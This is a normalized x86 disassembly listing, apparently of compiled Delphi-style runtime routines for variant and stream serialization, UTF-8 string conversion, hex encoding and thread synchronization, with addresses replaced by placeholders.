mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42c8d4
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_42ba9c
jmp r-xdata
sub_42cc2c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_42cce9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430944
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xd
call sub_42d794
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ccf0
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_42c8d4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42ba9c
sub_42cd08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42cd8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430868
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42ba9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov dl 0xd
call sub_42d794
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd91
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_42cd98
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_42cdf1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4307e8
mov eax [ ebp + 0x8 ]
push eax
call sub_42c4d4
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42cf50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cdf8
lea eax [ ebp - 0x10 ]
call sub_43ef1c
retn
sub_42cdfc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_42d7a8
mov eax [ ebp - 0x8 ]
push [ eax + 0x4c ]
push [ eax + 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_42c370
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
call sub_42bd6c
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_42fadc
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
movzx eax [ eax + lookup_table_42cecd ]
jmp [ eax * 4 + jump_table_42cee0 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_42fadc
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_42c6d0
pop ecx
jmp r-xdata
push ebp
call sub_42c7c8
pop ecx
jmp r-xdata
push ebp
call sub_42c844
pop ecx
jmp r-xdata
push ebp
call sub_42ca18
pop ecx
jmp r-xdata
push ebp
call sub_42cd08
pop ecx
jmp r-xdata
push ebp
call sub_42cd98
pop ecx
jmp r-xdata
push ebp
call sub_42c808
pop ecx
jmp r-xdata
push ebp
call sub_42cc2c
pop ecx
sub_42cf50
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42d315
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_445054
test al al
je r-xdata
mov eax ebx
call sub_444eec
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_441584
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_42ba78
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_440484
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_42bbf4
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_443610
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_42d78c
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d31c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x34 ]
call sub_44b8d8
lea eax [ ebp - 0x30 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
xor eax eax
push ebp
push sub_42d2bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_44534c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_42cfcb ]
mov eax ebx
call sub_440484
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_42bbf4
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_440fc8
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_443610
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
call sub_42d580
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_44b8d8
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_443c40
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_43bff8
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x8 ]
call sub_42d794
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42d794
jmp r-xdata
mov eax ebx
call sub_441584
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_42ba30
jmp r-xdata
mov eax ebx
call sub_441584
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_42ba0c
jmp r-xdata
mov eax ebx
call sub_441fa8
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_42ba54
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_443610
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_42d580
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x8 ]
call sub_42d794
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x8 ]
call sub_42d794
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42d2ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x14 ] eax
push 0x400
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42d251
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
call sub_448088
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x18 ]
call sub_42d580
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x18 ]
call sub_42b240
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_42b240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d258
mov eax [ ebp - 0x18 ]
call sub_4481b0
retn
sub_42d258
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x1c ] eax
mov dl 0xa
mov eax [ ebp - 0x8 ]
call sub_42d794
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_42b240
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_42b240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4481b0
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
sub_42d334
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d37a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_44a0e8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42d6b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d381
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42d398
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_449880
xor eax eax
push ebp
push sub_42d445
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44950c
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax ebx
call sub_42b240
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0xff
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_42b240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d44c
lea eax [ ebp - 0x4 ]
call sub_449348
retn
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44950c
sub_42d454
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_449880
mov eax [ ebp - 0x8 ]
call sub_449880
xor eax eax
push ebp
push sub_42d573
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call j_sub_4497bc
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xff
jg r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44950c
mov [ ebp - 0xc ] eax
mov dl 0x14
mov eax ebx
call sub_42d794
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_42b240
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_42b240
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov cx 0xfde9
mov edx [ ebp - 0x8 ]
call sub_44950c
mov dl 0xc
mov eax ebx
call sub_42d794
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_42b240
mov dl 0x6
mov eax ebx
call sub_42d794
lea edx [ ebp - 0xc ]
mov ecx 0x1
mov eax ebx
call sub_42b240
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d57a
lea eax [ ebp - 0x8 ]
call sub_449348
lea eax [ ebp - 0x4 ]
call sub_449348
retn
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_42b240
sub_42d580
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_42d6a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx 0xfde9
call sub_449f58
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
mov cx 0xfde9
mov edx [ ebp - 0x8 ]
call sub_44950c
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
cmp ebx eax
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov dl 0x12
mov eax esi
call sub_42d794
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx 0x0
call sub_449f58
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_42d454
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d6af
lea eax [ ebp - 0x10 ]
call sub_449348
lea eax [ ebp - 0x8 ]
call sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax esi
call sub_42b240
mov ecx [ ebp - 0xc ]
add ecx ecx
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42b240
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_42d6b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42d77f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
mov ecx 0xfde9
call sub_449f58
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov cx 0xfde9
mov edx [ ebp - 0x4 ]
call sub_44950c
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax esi
call sub_42b240
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x8 ] 0xff
lea eax [ ebp - 0x4 ]
call j_sub_4498a8
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_42b240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d786
lea eax [ ebp - 0x4 ]
call sub_449348
retn
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
mov cx 0xfde9
mov edx [ ebp - 0x4 ]
call sub_44950c
mov ebx eax
sub_42d7a8
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_42d7cc
push ebx
push esi
mov esi ecx
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
movzx ebx [ eax + ecx ]
shr ebx 0x4
movzx ebx [ ebx * 2 + rw-data ]
mov [ edx ] bx
movzx ebx [ eax + ecx ]
and bl 0xf
movzx ebx bl
movzx ebx [ ebx * 2 + rw-data ]
mov [ edx + 0x2 ] bx
add edx 0x4
inc ecx
dec esi
jne r-xdata
sub_42d80c
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov esi eax
mov edi [ esp ]
test edi edi
jle r-xdata
mov eax [ esp ]
sub eax edi
pop edx
pop ebp
pop edi
pop esi
retn
movzx ebp [ esi ]
mov ecx ebp
add ecx 0xffffffc6
sub cx 0x7
jb r-xdata
add ebp 0xffffffb9
sub bp 0x1a
jb r-xdata
movzx eax [ esi + 0x2 ]
mov ecx eax
add ecx 0xffffffc6
sub cx 0x7
jb r-xdata
add eax 0xffffffb9
sub ax 0x1a
jb r-xdata
movzx eax [ esi ]
add eax 0xffffffd0
sub ax 0x37
jae r-xdata
movzx eax [ esi + 0x2 ]
add eax 0xffffffd0
sub ax 0x37
jae r-xdata
movzx eax [ esi ]
movzx eax [ eax * 2 + rw-data ]
shl eax 0x4
movzx ecx [ esi + 0x2 ]
movzx ecx [ ecx * 2 + rw-data ]
add al cl
mov [ edx ] al
inc edx
add esi 0x4
dec edi
test edi edi
jg r-xdata
sub_42d8e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx rw-data
push 0x0
push ebx
call InterlockedExchange
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_42d94c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424bec
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4246e8
call sub_4481b0
inc esi
dec ebx
jne r-xdata
sub_42d9b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
call sub_42d964
mov eax ebx
call sub_42d970
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42db92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42db73
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db7a
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4246e8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4245dc
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_42db15
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42dad6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
cmp [ ebx + 0xa ] 0x0
je r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db1c
push rw-data
call EnterCriticalSection
retn
sub_42dadb
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call sub_448ca8
call sub_4475c0
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ edx + 0x14 ] eax
jmp r-xdata
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db1c
push rw-data
call EnterCriticalSection
retn
sub_42db1c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_44ab74
mov edx 0xc
mov eax [ ebp - 0x8 ]
call sub_4474a8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SetEvent
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4246e8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4245dc
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_42db15
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42dad6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
cmp [ ebx + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db7a
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db1c
push rw-data
call EnterCriticalSection
retn
sub_42dba4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
call sub_4015fc
mov edx [ ebp - 0x4 ]
mov [ eax + 0x8 ] edx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_42d98c
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_42dbf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_44932c
mov eax [ ebp - 0x4 ]
call sub_4481b0
sub_42dbf8
call sub_4475c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_42d98c
test bl bl
je r-xdata
mov eax esi
call sub_44932c
mov eax [ ebp - 0x4 ]
call sub_4481b0
sub_42dc58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_42dd3a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_448180
call sub_42d998
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
xor eax eax
jmp r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov [ esi + 0xe ] al
test bl bl
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov [ esi + 0xc ] al
cmp [ esi + 0x3c ] 0x0
jne r-xdata
mov al 0x1
call GetCurrentThread
mov [ esi + 0x4 ] eax
call GetCurrentThreadId
mov [ esi + 0x8 ] eax
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_42dba4
xor edx edx
xor eax eax
call sub_4492cc
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd41
lea eax [ ebp - 0x10 ]
call j_sub_449348
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_439344
mov eax [ ebp - 0x10 ]
